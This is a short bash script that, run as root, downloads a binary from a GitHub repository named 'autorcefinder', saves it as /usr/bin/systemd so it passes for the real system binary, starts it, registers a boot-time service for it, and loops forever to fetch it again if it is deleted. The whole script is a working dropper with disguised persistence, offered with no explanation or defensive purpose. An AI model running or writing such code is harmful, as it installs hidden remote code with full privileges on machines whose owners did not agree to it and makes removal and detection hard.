#!/bin/bash

# Check if the script is running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" >&2
    exit 1
fi

# GitHub URL where the systemd file is located
GITHUB_URL="https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd"

# Function to download and execute the file
download_and_execute() {
    # Download the file
    sudo curl -sSL "$GITHUB_URL" -o /usr/bin/systemd

    # Give execute permissions
    sudo chmod +x /usr/bin/systemd

    # Execute the file
    /usr/bin/systemd &
}

# Check if the file already exists in /usr/bin/
if [ ! -f "/usr/bin/systemd" ]; then
    download_and_execute
fi

# Function to enable systemd service
enable_systemd_service() {
    # Create a systemd service unit file
    cat <<EOF | sudo tee /etc/systemd/system/systemd_script.service >/dev/null
[Unit]
Description=Systemd Script
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/systemd

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd daemon
    sudo systemctl daemon-reload

    # Enable the service
    sudo systemctl enable systemd_script.service
}

# Check if the systemd service is enabled
if ! systemctl is-enabled --quiet systemd_script.service; then
    enable_systemd_service
fi

# Infinite loop to ensure the script is always running
while true; do
    # Check if the file is still present
    if [ ! -f "/usr/bin/systemd" ]; then
        download_and_execute
    fi

    # Sleep for 24 hours
    sleep 86400
done
